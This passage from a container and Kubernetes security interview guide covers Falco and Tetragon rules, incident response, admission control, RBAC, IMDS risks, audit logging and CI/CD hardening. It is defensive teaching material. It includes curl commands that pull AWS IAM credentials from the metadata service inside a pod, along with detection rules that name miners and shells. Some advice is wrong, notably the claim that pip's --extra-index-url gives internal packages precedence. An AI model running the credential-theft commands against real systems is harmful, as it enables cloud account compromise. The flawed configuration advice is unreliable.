    and not fd.sip in (trusted_cidrs)
  priority: HIGH

# 3. Write to sensitive files
- rule: Write Below /etc
  condition: >
    open_write and container
    and fd.name startswith /etc
    and not proc.name in (package_managers)
  priority: HIGH

# 4. Cryptomining detection
- rule: Crypto Miner Activity
  condition: >
    spawned_process and container
    and (proc.name in (known_miners) or
         proc.cmdline contains "--mining-threads")
  priority: CRITICAL

# 5. Privilege escalation
- rule: SetUID or SetGID bit set
  condition: >
    chmod and container
    and evt.arg.mode contains S_ISUID
  priority: WARNING
```

**Tune to reduce false positives:**
```yaml
# Use macros and lists
- list: allowed_processes
  items: [nginx, node, python3]

- macro: expected_outbound
  condition: fd.sip in ("10.0.0.0/8", "172.16.0.0/12")

- rule: Suspicious Outbound
  condition: outbound and container and not expected_outbound
```

---

### Q60. What is Tetragon, and how does it differ from Falco?

**Tags:** `Tetragon` `eBPF` `enforcement` `Cilium` `policy`

**Answer:**

**Tetragon** (Cilium project) is an eBPF-based security observability and enforcement tool.

**Key differences from Falco:**

| Feature | Falco | Tetragon |
|---------|-------|----------|
| Enforcement | Detect only (alert) | **Enforce in-kernel** (SIGKILL) |
| Integration | Standalone / Kubernetes | Deeply integrated with Cilium |
| Policy language | YAML rules | TracingPolicy CRD |
| Overhead | eBPF or kernel module | eBPF only |
| Scope | Syscalls + k8s events | Process, network, file, syscall + identity-aware |
| Identity | Container metadata | **SPIFFE/Cilium identity-aware** |

**Tetragon enforcement (unique):**
```yaml
# Kill process immediately on violation (no alert lag)
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-shell-execution
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    args:
    - index: 0
      type: "linux_binprm"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/bin/sh"
        - "/bin/bash"
      matchActions:
      - action: Sigkill  # Kills the process in-kernel, before execve completes
```

**Identity-aware policy (vs. Falco's container-level):**
```yaml
# Block only specific workloads based on Cilium identity
selectors:
- matchNamespace:
    operator: In
    values:
    - untrusted-workloads
  matchLabels:
  - key: app
    operator: In
    values:
    - user-code-runner
```

**Use case:** Tetragon is ideal when you want **prevention** (not just detection) and are already using Cilium. Falco is broader and easier to integrate with non-Cilium environments.

---

### Q61. How do you respond to a suspected container escape incident?

**Tags:** `incident-response` `forensics` `container-escape` `containment`

**Answer:**

**Incident Response Playbook for Container Escape:**

**Phase 1: Detection**
```bash
# Indicators of compromise:
# - Unexpected process in host PID namespace from container context
# - Writes to host filesystem outside container overlay
# - New network connections from unexpected host IPs
# - Falco/Tetragon alerts: namespace escape, mount, setns syscalls

# Immediate verification
ps auxf | grep -v grep | grep -E "(containerd-shim|runc)"
# Check for processes that should be in containers but are in host PID NS
cat /proc/*/status | grep NSpid  # Check PID namespace IDs
```

**Phase 2: Containment**
```bash
# 1. Isolate the container immediately
docker pause <container-id>  # Freeze execution
# Or if escape already happened:
kill -STOP <escaped-process-pid>

# 2. Isolate the host node
# Remove from load balancer (no new traffic)
# Block outbound network (contain lateral movement)
iptables -I OUTPUT -j DROP  # Emergency — will break everything, coordinate first

# 3. Preserve evidence before any changes
# Take memory dump
dd if=/proc/<pid>/mem of=/tmp/mem-dump.bin
# Capture network connections
ss -tunap > /tmp/network-state.txt
netstat -anp > /tmp/netstat.txt
# List open files
lsof -p <pid> > /tmp/open-files.txt
# Copy /proc metadata
cp -r /proc/<pid>/ /tmp/proc-snapshot/
```

**Phase 3: Investigation**
```bash
# Reconstruct what happened
# 1. Check Docker/containerd event logs
docker events --since 24h | grep -E "(exec|create|start)"
journalctl -u containerd --since "2024-01-01 10:00" | grep -i escape

# 2. Check audit logs
ausearch -k namespace-escape -ts recent
ausearch -k container-mount -ts recent

# 3. Check modified files on host
find / -newer /tmp/incident-baseline -not -path "*/proc/*" 2>/dev/null

# 4. Check for persistence mechanisms
crontab -l
ls -la /etc/cron.*
cat /etc/rc.local
ls -la /etc/systemd/system/

# 5. Check network connections
ss -tunap
cat /proc/net/tcp  # Raw network connections
```

**Phase 4: Remediation**
```bash
# 1. Terminate escaped processes
kill -9 <pid>

# 2. Remove compromised container and image
docker rm -f <container-id>
docker rmi <image-id>

# 3. Rotate all credentials that may have been exposed
# API keys, DB passwords, TLS certs

# 4. Patch the vulnerability (runc, kernel, container config)

# 5. Re-evaluate and tighten security controls
# Enable missing controls (seccomp, AppArmor, user-ns)

# 6. Restore from known-good backup if host is compromised
```

---

## Section 8: Kubernetes + Container Security

---

### Q62. What is Pod Security Admission (PSA), and how does it replace PodSecurityPolicy?

**Tags:** `PSA` `PSP` `pod-security` `admission` `kubernetes`

**Answer:**

**PodSecurityPolicy (PSP)** was deprecated in Kubernetes 1.21 and removed in 1.25. **Pod Security Admission (PSA)** replaced it as a built-in admission controller.

**PSA Security Levels:**

| Level | Description | Use Case |
|-------|-------------|----------|
| `privileged` | No restrictions | System components (kube-system) |
| `baseline` | Prevents known privilege escalations | General workloads |
| `restricted` | Strongly restricted, follows best practices | High-security workloads |

**PSA Modes:**
- `enforce` — Reject violating pods
- `audit` — Log violations, allow pods
- `warn` — Return warning to user, allow pods

**Implementation:**
```yaml
# Namespace-level policy via labels
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**`restricted` profile requirements:**
```yaml
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault  # or Localhost
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
      # Cannot add any capabilities under restricted profile
```

**PSA limitations vs. PSP:**
- No per-user or per-group policies
- No network policy integration
- No volume type restrictions (PSP had `allowedHostPaths`, `allowedVolumes`)
- Use OPA/Gatekeeper or Kyverno for fine-grained policies

---

### Q63. How does OPA/Gatekeeper enforce container security policies in Kubernetes?

**Tags:** `OPA` `Gatekeeper` `admission-webhook` `Rego` `policy-as-code`

**Answer:**

**OPA (Open Policy Agent)** is a general-purpose policy engine. **Gatekeeper** is the Kubernetes-specific OPA integration using validating admission webhooks.

**Architecture:**
```
kubectl apply → kube-apiserver → Gatekeeper Webhook → OPA Rego evaluation → Allow/Deny
```

**Constraint Template (defines policy schema):**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          properties:
            labels:
              type: array
              items: { type: string }
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredlabels
      violation[{"msg": msg}] {
        required := input.parameters.labels
        provided := {label | input.review.object.metadata.labels[label]}
        missing := required - provided
        count(missing) > 0
        msg := sprintf("Missing required labels: %v", [missing])
      }
```

**Constraint (enforces policy):**
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters:
    labels: ["team", "environment", "app"]
```

**Security policies as Gatekeeper constraints:**
```rego
# Block privileged containers
package privilegedcontainer

violation[{"msg": msg}] {
  c := input.review.object.spec.containers[_]
  c.securityContext.privileged == true
  msg := sprintf("Privileged container not allowed: %v", [c.name])
}

# Require image digest (no mutable tags)
package requiredigest

violation[{"msg": msg}] {
  container := input.review.object.spec.containers[_]
  not contains(container.image, "@sha256:")
  msg := sprintf("Image must use digest: %v", [container.image])
}
```

---

### Q64. What is the Kubernetes admission control pipeline, and where do security controls plug in?

**Tags:** `admission-control` `webhook` `mutating` `validating` `pipeline`

**Answer:**

**Admission control pipeline:**
```
kubectl → API Server Authentication → Authorization (RBAC) → Admission Controllers → etcd
```

**Built-in admission controllers (security-relevant):**

| Controller | Function |
|-----------|----------|
| `NodeRestriction` | kubelets can only modify their own node/pods |
| `PodSecurity` | Enforces PSA levels |
| `ResourceQuota` | Prevents resource exhaustion |
| `LimitRanger` | Sets default resource limits |
| `ServiceAccount` | Auto-mounts service account tokens |
| `SecurityContextDeny` | Blocks certain securityContext fields (deprecated, use PSA) |
| `AlwaysPullImages` | Forces image pull on every pod start (prevents cached stale images) |
| `DenyEscalatingExec` | Blocks exec into privileged containers |
| `ImagePolicyWebhook` | Calls external webhook for image policy decisions |

**Mutating vs. Validating webhooks:**

```
Request → [MutatingAdmissionWebhooks] → [Object saved] → [ValidatingAdmissionWebhooks]
              ↑                                                      ↑
       Gatekeeper Mutation                               Gatekeeper Validation
       Kyverno mutate                                    OPA/Kyverno deny rules
       Vault Agent injection                             Signature verification
       Linkerd sidecar injection                         PSA
```

**Order matters:** Mutating webhooks run first (can add defaults, inject sidecars). Validating webhooks run after mutation (validates final state).

**Webhook configuration:**
```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: gatekeeper-validating-webhook
webhooks:
- name: validation.gatekeeper.sh
  failurePolicy: Fail  # IMPORTANT: Fail = deny if webhook unreachable
  # vs. Ignore = allow if webhook unreachable (dangerous!)
  matchPolicy: Equivalent
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE", "UPDATE"]
    resources: ["pods"]
  clientConfig:
    service:
      name: gatekeeper-webhook-service
      namespace: gatekeeper-system
      port: 443
    caBundle: <base64-ca-cert>
  admissionReviewVersions: ["v1"]
  sideEffects: None
  timeoutSeconds: 10  # Shorter timeout = less blast radius on slowness
```

---

### Q65. What is RBAC in Kubernetes, and what are the most critical misconfigurations?

**Tags:** `RBAC` `privilege-escalation` `ServiceAccount` `ClusterRole`

**Answer:**

**RBAC components:**
- **Role/ClusterRole:** Defines permissions (verbs on resources)
- **RoleBinding/ClusterRoleBinding:** Binds role to subjects (users, groups, ServiceAccounts)

**Critical RBAC misconfigurations:**

**1. Wildcard permissions:**
```yaml
# DANGEROUS - grants all permissions on all resources
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

**2. Secrets `list`/`watch` permission:**
```yaml
# This allows reading ALL secrets in the namespace
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["list", "watch"]  # list returns all secret contents!
```

**3. `pods/exec` permission:**
```yaml
# Grants ability to exec into any pod = code execution
rules:
- apiGroups: [""]
  resources: ["pods/exec", "pods/portforward"]
  verbs: ["create"]
```

**4. Privilege escalation via `bind`/`escalate`:**
```yaml
# If a ServiceAccount can bind ClusterRoles, it can grant itself cluster-admin
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterrolebindings"]
  verbs: ["create"]  # Can create binding to cluster-admin!
```

**5. `nodes/proxy` resource:**
```yaml
# Allows proxying to kubelet API — bypasses API server authz for pod operations
rules:
- apiGroups: [""]
  resources: ["nodes/proxy"]
  verbs: ["*"]
```

**Audit RBAC:**
```bash
# Find all ClusterRoleBindings to cluster-admin
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Find ServiceAccounts with overly broad permissions
kubectl auth can-i --list --as=system:serviceaccount:default:myapp

# rbac-audit tool
kubectl-rbac-audit
```

---

### Q66. Explain the security risks of the Kubernetes Metadata API and how to mitigate them.

**Tags:** `metadata-API` `SSRF` `IMDS` `cloud-provider` `credential-theft`

**Answer:**

**Cloud providers expose an Instance Metadata Service (IMDS)** at `http://169.254.169.254` (AWS) or `http://metadata.google.internal` (GCP). This service provides instance identity, credentials (IAM role credentials), and configuration data.

**Risk:** A compromised container (or SSRF vulnerability in a pod) can reach the IMDS and steal cloud credentials:

```bash
# From inside an AWS EKS pod without IMDS restrictions:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role-name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-node-role
# Returns: AccessKeyId, SecretAccessKey, Token (valid for ~6 hours)
# Attacker now has node-level AWS access!
```

**Mitigations:**

**1. IMDSv2 (AWS) — Requires PUT request before GET:**
```bash
# IMDSv2 requires a session token obtained via PUT
# Simple GET (SSRF-style) no longer works
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
# SSRF tools typically only do GET — blocked by IMDSv2
```

**2. Block IMDS at pod level (EKS):**
```yaml
# EKS: Disable access to IMDS for specific pods
# Use hop limit restriction (EC2 launch template)
# --metadata-options HttpTokens=required,HttpPutResponseHopLimit=1
# Pods need 2 hops (host → container), limit of 1 blocks containers
```

**3. Workload Identity (no IMDS needed):**
- AWS IRSA: Pod gets JWT, exchanges with AWS STS for credentials. No IMDS needed.
- GKE Workload Identity: Pod impersonates GSA directly.

**4. NetworkPolicy to block IMDS:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata-api
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32  # Block IMDS
```

---

## Section 9: Compliance, Auditing & Hardening

---

### Q67. How do you implement comprehensive audit logging for containerized environments?

**Tags:** `audit-logging` `Kubernetes-audit` `Falco` `SIEM` `compliance`

**Answer:**

**Layered audit strategy:**

**Layer 1: Kubernetes API Server Audit:**
```yaml
# audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Never audit (noisy, low value)
- level: None
  resources:
  - group: ""
    resources: ["events"]

# Audit all secrets access at metadata level
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets", "configmaps"]

# Full audit of privileged operations
- level: RequestResponse
  verbs: ["create", "update", "patch", "delete"]
  resources:
  - group: ""
    resources: ["pods/exec", "pods/portforward"]
  - group: "rbac.authorization.k8s.io"

# Request body for pod creation
- level: Request
  verbs: ["create"]
  resources:
  - group: ""
    resources: ["pods"]

# Default: metadata only
- level: Metadata
```

```yaml
# kube-apiserver flags
--audit-log-path=/var/log/kubernetes/audit/audit.log
--audit-log-maxsize=100       # MB
--audit-log-maxbackup=10
--audit-log-maxage=30         # days
--audit-policy-file=/etc/kubernetes/audit-policy.yaml
--audit-log-format=json       # Machine-parseable
```

**Layer 2: Container runtime events:**
```bash
# containerd events
ctr events

# Docker events (if used)
docker events --format '{{json .}}'

# Send to SIEM via Fluentd/Vector
```

**Layer 3: System call audit (auditd):**
```bash
# Rules covering container security events
-w /var/lib/docker -p wa -k docker-data
-w /etc/docker -p wa -k docker-config
-a always,exit -F arch=b64 -S execve -F ppid=<containerd-shim-pid> -k container-exec
```

**Layer 4: Application-level audit:**
- Structured JSON logs from applications
- Include: user, action, resource, timestamp, source IP, result

**SIEM integration:**
```yaml
# Fluentd → Elasticsearch/Splunk/Datadog
# Vector → any backend
# Elastic Agent (beats) → Elasticsearch with ECS schema
```

---

### Q68. What is a container security benchmark, and how do you automate compliance checks?

**Tags:** `CIS-benchmark` `compliance` `automation` `kube-bench` `docker-bench`

**Answer:**

**Container security benchmarks:**

| Benchmark | Scope | Publisher |
|-----------|-------|-----------|
| CIS Docker Benchmark | Docker daemon, host, images | CIS |
| CIS Kubernetes Benchmark | Kubernetes components | CIS |
| NIST SP 800-190 | Application container security | NIST |
| NSA/CISA Kubernetes Hardening Guidance | Kubernetes hardening | NSA/CISA |
| STIG for Docker | DoD environments | DISA |

**Automated assessment tools:**

```bash
# Docker Benchmark
docker run --rm -it \
  --net host --pid host --userns host --cap-add audit_control \
  -v /etc:/etc:ro \
  -v /lib/systemd/system:/lib/systemd/system:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security

# Kubernetes Benchmark (kube-bench)
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs job/kube-bench

# Trivy for misconfigurations
trivy k8s --report=summary cluster

# Checkov for IaC scanning (Dockerfiles, Helm, Terraform)
checkov -d . --framework dockerfile
checkov -d ./helm --framework helm
```

**CI/CD integration:**
```yaml
# GitHub Actions - continuous compliance
- name: Run CIS benchmark
  run: |
    docker run --rm docker/docker-bench-security 2>&1 | \
      grep -E '\[WARN\]|\[FAIL\]' | \
      tee benchmark-results.txt
    # Fail if critical findings
    grep -c '\[FAIL\]' benchmark-results.txt | \
      xargs -I{} test {} -eq 0
```

---

### Q69. How do you implement a zero-trust security model for containerized workloads?

**Tags:** `zero-trust` `mTLS` `SPIFFE` `workload-identity` `micro-segmentation`

**Answer:**

**Zero-trust principles for containers:**
1. Never trust, always verify — no implicit trust based on network location
2. Least privilege access — minimal permissions for each workload
3. Assume breach — design for lateral movement containment
4. Verify explicitly — cryptographic identity for all workload-to-workload communication

**Implementation layers:**

**1. Workload Identity (SPIFFE/SPIRE):**
```yaml
# Each workload gets a SPIFFE ID: spiffe://trust-domain/ns/namespace/sa/serviceaccount
# SPIRE issues X.509 SVIDs (short-lived, auto-rotating certificates)
# No static credentials — identity is cryptographically bound to workload metadata
```

**2. mTLS everywhere (Istio/Linkerd):**
```yaml
# Istio: enforce mTLS for all service communication
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT  # Reject all non-mTLS connections
```

**3. Authorization Policy (Istio):**
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: backend-access
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/frontend"]  # Only frontend SA
  - to:
    - operation:
        methods: ["GET"]
        paths: ["/api/*"]
```

**4. Network micro-segmentation:**
```yaml
# Default deny all, explicit allow per service
# Ingress: only from known services
# Egress: only to needed external endpoints
```

**5. Image identity verification:**
```bash
# Every deployed image must have valid Cosign signature from CI pipeline
# Gatekeeper/Kyverno enforces at admission time
```

**6. Audit every access:**
```yaml
# API server audit: every kubectl command
# Istio access logs: every service-to-service call
# Falco: every unexpected syscall
```

---

### Q70. What are the security considerations for container image registries in a multi-cloud environment?

**Tags:** `multi-cloud` `registry` `replication` `access-control` `data-residency`

**Answer:**

**Multi-cloud registry challenges:**

1. **Image distribution:** Pulling from a single region increases latency and creates single point of failure. Replicating images increases attack surface.

2. **Consistent access control:** Different cloud IAM models (AWS IAM, GCP IAM, Azure RBAC) — hard to maintain consistent RBAC across clouds.

3. **Data residency:** Some images may contain proprietary code — data residency laws may restrict which regions images can be stored.

4. **Vulnerability scanning:** Need consistent scanning policy across all registries.

5. **Signature verification:** Each cloud's registry has different signing support (ECR with Notation, GAR with Binary Authorization, ACR with Notary).

**Architecture patterns:**

```
Option A: Single authoritative registry + cloud-native mirrors
  GitHub Container Registry (authoritative) →
    ECR (us-east-1, us-west-2) → AWS workloads
    GAR (us-central1, eu-west1) → GKE workloads
    ACR (eastus, westeurope) → AKS workloads

Option B: Harbor as multi-cloud hub
  Harbor → replication rules → AWS ECR
           → replication rules → GCP GAR
           → replication rules → Azure ACR
  Single RBAC model in Harbor
  Single scan policy in Harbor

Option C: OCI Distribution registry (self-hosted) on all clouds
  All clouds pull from internal Kubernetes-hosted registry
  VPN/private interconnect between clouds
```

**Security controls:**
```bash
# Consistent image signing: use Cosign (cloud-agnostic)
cosign sign --key cosign.key $IMAGE  # Works with ECR, GAR, ACR, GHCR

# Consistent admission policy: Kyverno (applied per-cluster, same policy)
# Policy synced via GitOps (Flux/ArgoCD)

# Vulnerability scanning: use cloud-agnostic Trivy + report to central SIEM

# Access: use OIDC federation where possible
# AWS: assume role from GCP workload identity (no static keys)
# Use short-lived credentials everywhere
```

---

### Q71. How do you perform a container security threat model?

**Tags:** `threat-modeling` `STRIDE` `attack-tree` `risk-assessment`

**Answer:**

**STRIDE threat model for a containerized application:**

**System components to model:**
```
[Developer] → [CI/CD] → [Registry] → [Kubernetes] → [Container] → [Database]
                                           ↑
                                     [Admin/kubectl]
```

**STRIDE analysis:**

| Threat | Example | Mitigation |
|--------|---------|------------|
| **S**poofing | Container impersonates another service | mTLS + SPIFFE workload identity |
| **T**ampering | Malicious image layer injected | Cosign signing + admission policy |
| **R**epudiation | No record of who ran what container | API audit log + Falco events |
| **I**nformation Disclosure | Secrets in env vars, image layers | CSI driver, secret scanning |
| **D**enial of Service | Container with no limits exhausts CPU/mem | Resource limits + ResourceQuota |
| **E**levation of Privilege | Container escapes to host root | seccomp, caps drop, no-new-privs |

**Attack tree for container escape:**
```
Container Escape
├── Exploit kernel vulnerability
│   ├── Via syscall (mitigate: seccomp)
│   └── Via device driver (mitigate: no --privileged)
├── Exploit runtime vulnerability (runc/containerd)
│   └── Patch runc, use gVisor
├── Misconfigured container
│   ├── --privileged (mitigate: admission control)
│   ├── hostPath mount (mitigate: PSA restricted)
│   └── CAP_SYS_ADMIN (mitigate: drop all caps)
└── Application vulnerability → RCE → Container
    └── Then attempt escape from inside
```

**Risk scoring matrix:**
```
Likelihood × Impact = Risk Score
High × Critical = P0 (immediate fix)
Medium × High = P1 (fix in sprint)
Low × Medium = P2 (backlog)
```

**Threat modeling tools:**
- OWASP Threat Dragon
- Microsoft Threat Modeling Tool
- IriusRisk
- Manual: Architecture diagram + STRIDE worksheet

---

### Q72–Q80: Advanced Topics

---

### Q72. What is Confidential Computing, and how does it apply to containers?

**Tags:** `confidential-computing` `TEE` `SGX` `SNP` `Kata`

**Answer:**

**Confidential Computing** uses hardware-based Trusted Execution Environments (TEEs) to protect data in use (not just at rest and in transit).

**Hardware TEE technologies:**

| Technology | Provider | Granularity |
|-----------|---------|-------------|
| Intel SGX | Intel | Application-level enclaves |
| AMD SEV-SNP | AMD | VM-level memory encryption |
| ARM TrustZone | ARM | Secure world for ARM |
| Intel TDX | Intel | VM-level TEEs |

**Container applications:**

1. **Kata Containers + SEV-SNP:** Each Kata VM gets encrypted memory. Even the hypervisor cannot read VM memory. Cloud provider cannot inspect container contents.

2. **Confidential Container Specifications (CoCo):**
   - Container image encrypted in registry
   - Image decrypted only inside TEE (attestation proves TEE identity)
   - Cloud provider sees only encrypted memory

3. **Attestation:** TEE generates a hardware-signed quote proving:
   - What hardware is being used
   - What software is running
   - What measurement the software has
   - External verifier (Attestation Service) validates before releasing decryption key

**Use cases:** Medical AI models, financial data processing, privacy-preserving analytics where even the cloud operator should not access data.

**Tradeoffs:** Significant performance overhead (SGX ~3-5x), limited memory (SGX EPC), complexity.

---

### Q73. How do container image layers affect forensic investigations?

**Tags:** `forensics` `image-layers` `overlay` `evidence`

**Answer:**

**Layer structure for forensics:**

```bash
# Examine image layer by layer
docker save myimage:latest | tar -xf - -C /tmp/image-analysis/
ls /tmp/image-analysis/
# manifest.json  blobs/  oci-layout

# Extract each layer
for layer in $(jq -r '.[].Layers[]' /tmp/image-analysis/manifest.json); do
  mkdir -p /tmp/layers/$layer
  tar -xf /tmp/image-analysis/$layer -C /tmp/layers/$layer
done

# Find files added/modified in each layer
# Each layer is a diff — only changed files present
```

**Upper layer (container writes):**
```bash
# Find the container's upper layer (writable layer)
docker inspect <container-id> | jq '.[].GraphDriver.Data'
# Returns UpperDir path

UPPERDIR=$(docker inspect <container-id> | jq -r '.[].GraphDriver.Data.UpperDir')
# All container-written files are here
ls -la $UPPERDIR
find $UPPERDIR -newer /tmp/start-time -type f
```

**Forensic artifacts in containers:**

```bash
# Process activity
cat /proc/<pid>/cmdline  # Command line arguments
cat /proc/<pid>/environ  # Environment variables
ls -la /proc/<pid>/fd/   # Open file descriptors
cat /proc/<pid>/net/tcp  # Network connections

# Bash history (if bash was used)
cat $UPPERDIR/root/.bash_history
cat $UPPERDIR/home/*/.bash_history

# Cron jobs added by attacker
ls -la $UPPERDIR/etc/cron.d/
cat $UPPERDIR/var/spool/cron/root

# New/modified binaries
find $UPPERDIR/usr/bin /usr/sbin -newer /tmp/start-time -type f

# Persistence mechanisms
cat $UPPERDIR/etc/rc.local
ls $UPPERDIR/etc/systemd/system/
```

---

### Q74. What is the security impact of running containers as root, and how do you migrate to non-root?

**Tags:** `non-root` `UID` `USER` `rootless` `privilege`

**Answer:**

**Risks of running as root (UID 0) in containers:**

1. **Container escape blast radius:** Escape gives host root (without user-ns remapping)
2. **File system access:** Root can read any file in the container's mount namespace
3. **Network operations:** Root can bind ports < 1024, create raw sockets (CAP_NET_RAW), modify iptables
4. **Process operations:** Can send signals to any process, ptrace others

**Migration to non-root:**

```dockerfile
# Step 1: Create dedicated user in Dockerfile
FROM alpine:3.19
RUN addgroup -g 1001 appgroup && \
    adduser -u 1001 -G appgroup -s /sbin/nologin -D appuser

# Step 2: Set ownership of app files
COPY --chown=appuser:appgroup app /app/
RUN chmod 755 /app/app

# Step 3: Set USER directive
USER 1001:1001  # Use numeric IDs (not names) for portable security

# Step 4: Use non-privileged port (8080 not 80)
EXPOSE 8080
```

**Common issues and fixes:**

```dockerfile
# Issue: App needs to write to /tmp
# Fix: Create writable directory owned by appuser
RUN mkdir -p /tmp/app && chown appuser:appgroup /tmp/app
VOLUME /tmp/app

# Issue: App needs to bind port 443
# Fix: Use port 8443 and put TLS termination at load balancer

# Issue: setuid binaries (ping, etc.)
# Fix: Use capabilities instead
# docker run --cap-add NET_RAW myimage
# Or install libcap-ng: setcap cap_net_raw+ep /usr/bin/ping

# Issue: /var/run/*.pid files
# Fix: Use user-owned directory
RUN mkdir -p /var/run/myapp && chown appuser /var/run/myapp
```

**Kubernetes enforcement:**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1001
  runAsGroup: 1001
  fsGroup: 1001  # Volume ownership
```

---

### Q75. How do you manage container lifecycle security — from creation to termination?

**Tags:** `lifecycle` `admission` `runtime` `termination` `security`

**Answer:**

**Container lifecycle security at each phase:**

**Pre-creation (Admission):**
```
Pod spec submitted → Admission webhooks → OPA/Gatekeeper/Kyverno
  ✓ Image signed?
  ✓ No privileged flag?
  ✓ Resource limits set?
  ✓ Non-root user?
  ✓ Read-only root filesystem?
  ✓ No hostPath volumes?
  ✓ Seccomp profile set?
```

**Creation (Runtime setup):**
```bash
# containerd: create snapshot, generate OCI spec
# runc: setup namespaces, cgroups, capabilities, seccomp
# Mount: overlayfs, bind mounts, tmpfs for secrets
# Network: assign IP, setup interfaces
# Verify: AppArmor/SELinux label applied
```

**Running (Continuous monitoring):**
```bash
# Falco: syscall monitoring
# Tetragon: process/network/file monitoring
# Resource monitoring: CPU/mem within limits?
# Health checks: liveness/readiness probes
# Log collection: stdout/stderr to SIEM
```

**Termination (Cleanup):**
```bash
# SIGTERM sent → graceful shutdown window (default 30s)
# SIGKILL if graceful shutdown times out
# Snapshot deleted (container's upper layer gone)
# tmpfs secrets unmounted and zeroed
# Network interface removed
# cgroup cleaned up

# Security verification post-termination:
# - No orphaned processes in container namespaces
# - No leftover network rules
# - No persistent data left in unexpected locations
ls /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/  # Should be cleaned
```

**Termination security:**
```yaml
spec:
  terminationGracePeriodSeconds: 30
  containers:
  - lifecycle:
      preStop:
        exec:
          command: ["/bin/sh", "-c", "shred -u /tmp/sensitive-data"]
          # Securely delete sensitive temp files before termination
```

---

### Q76. What is supply chain attack via CI/CD, and how do you harden your pipeline?

**Tags:** `CI/CD-security` `supply-chain` `SLSA` `pipeline-hardening`

**Answer:**

**CI/CD supply chain attacks:**

1. **Dependency confusion:** Attacker publishes malicious package with same name as internal package to public registry. CI installs public version.

2. **Compromised GitHub Action:** Malicious action or action with compromised dependency.
   - Example: `actions/checkout@main` — using `@main` instead of `@v3.5.2` is dangerous

3. **Build environment compromise:** Attacker gains access to CI runner, modifies build artifacts, backdoors images.

4. **Secrets exfiltration:** Malicious PR prints CI secrets to logs.

5. **Cache poisoning:** Malicious actor poisons build cache in shared environment.

**Hardening CI/CD:**

```yaml
# GitHub Actions hardening
name: Secure Build
permissions:
  contents: read       # Minimal permissions
  id-token: write      # Only for OIDC signing
  packages: write      # Only for registry push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    # 1. Pin ALL actions to SHA (not tag)
    - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
    
    # 2. Pin Docker images in CI
    - name: Build
      run: docker build --no-cache .
      
    # 3. Never print env vars
    - name: Validate secrets exist
      run: |
        [ -n "${{ secrets.REGISTRY_TOKEN }}" ] || exit 1
        # Do NOT: echo ${{ secrets.REGISTRY_TOKEN }}
        
    # 4. Dependency review on PRs
    - uses: actions/dependency-review-action@v3
    
    # 5. SLSA provenance
    - uses: slsa-framework/slsa-github-generator/.github/workflows/container_generator.yml@v1
```

```bash
# Dependency confusion protection
# .npmrc
@mycompany:registry=https://internal.registry.example.com/
always-auth=true

# pip
--index-url https://internal.pypi.example.com/
--extra-index-url https://pypi.org/simple/
# Internal packages always take precedence

# Go modules
GONOSUMCHECK=github.com/mycompany/*
GOFLAGS=-mod=vendor  # Use vendored deps, don't fetch
```

---

### Q77. What are the security risks of container log management, and how do you handle sensitive data in logs?

**Tags:** `logging` `PII` `sensitive-data` `log-scrubbing` `compliance`

**Answer:**

**Sensitive data risks in container logs:**

1. **Credentials in stack traces:** `java.sql.SQLException: Access denied for user 'admin'@'%' (using password: 'SECRETPASSWORD123')` — database passwords logged on connection failure.

2. **PII in access logs:** `GET /api/users/ssn/123-45-6789 HTTP/1.1` — SSNs in URL paths, logged by nginx.

